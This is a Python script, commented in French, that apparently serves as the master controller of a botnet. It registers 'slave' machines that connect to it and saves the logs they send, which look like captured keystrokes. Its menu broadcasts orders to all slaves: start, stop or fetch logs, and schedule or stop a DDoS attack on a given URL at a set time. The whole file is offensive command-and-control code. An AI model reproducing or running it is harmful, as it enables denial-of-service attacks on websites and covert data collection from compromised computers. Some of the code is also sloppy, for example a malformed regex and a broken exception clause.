# Imports et installation des paquets requis ---------------------------------------------------------------------------
import socket, re, threading, argparse


# Création de l'objet maître -------------------------------------------------------------------------------------------
class Master:
    def __init__(self, address: str, port: int):
        self.ip = address
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.liste_addr = []
        self.flag = False
        self.t1 = threading.Thread(target=self.listen)

    # Ouverture du serveur et écoute des ports -------------------------------------------------------------------------
    def listen(self):
        try:
            self.socket.bind((self.ip, self.port))
            self.socket.listen()
        except socket.error:
            print("Error, Retry")
            self.listen()
        print("Socket is Bind, Accept connection")
        self.flag = True
        while self.flag:
            try:
                conn, addr = self.socket.accept()
                print(f"Connection Accepted from {addr}")
                message = conn.recv(1024).decode()
                conditions = [
                    bool(re.search("[0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}[:][0-9]{1,5}", message)),
                    bool(re.search("[Localhost][:][0-9]{1,5}", message))
                ]
                if any(conditions):
                    temp = message.split(":")
                    ip = temp[0]
                    port = int(temp[1])
                    temp2 = (ip, port)
                    self.liste_addr.append(temp2)
                else:
                    conditions2 = [bool(re.search("[3:]", message))]
                    if any(conditions2):
                        try:
                            f = open(f"log{str(addr)}.txt", "a")
                            f.write(message)
                            f.close()
                        except FileNotFoundError():
                            f = open(f"log{str(addr[0])}.txt", "w")
                            f.write(message)
                            f.close()
                    else:
                        print(message)
            except socket.error:
                print("Erreur lors de la connection du slave")

    # Menu des actions disponibles -------------------------------------------------------------------------------------
    def choice(self):
        try:
            choix = input(print("Choississez une des options suivantes :\n1.Démarrer les logs\n2.Stoppez les logs\n3.Recuperer les logs. (Format: 3-Nombre de ligne que l'on veut récupèrer)\n4.Programmez une Attaque DDOS (Format: 4-URL-HH:MM:SS)\n5.Arrêtez le DDOS\n"))
            conditions = [
                choix in ["1", "2","5"],
                bool(re.search("3-[0-9]{1,100}", choix)),
                bool(re.search("4-.*-[0-9]{2}:[0-9]{2}:[0-9]{2}", choix))
            ]
            if any(conditions):
                self.send_msg(choix.encode())
            else:
                print("Erreur dans le format")
        finally:
            self.choice()

    # Envoi de l'ordre sélectionné aux esclaves ------------------------------------------------------------------------
    def send_msg(self, choix):
        for slave_ad in self.liste_addr:
            alter_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                alter_socket.connect(slave_ad)
                print("Connect to Slave")
            except socket.error:
                print("Impossible de se connecter au slave")
            alter_socket.send(choix)
            alter_socket.shutdown(socket.SHUT_RDWR)
            alter_socket.close()



########################################################################################################################
parser = argparse.ArgumentParser()
parser.add_argument("-ad", "--address", action="store",type=str, help="Spécifie l'adresse IP de votre machine Master")
parser.add_argument("-p", "--port", action="store", type=int, help="Spécifier le port utilisé par le Master pour l'écoute")
args = parser.parse_args()
master = Master(args.address, args.port)
master.t1.start()
master.choice()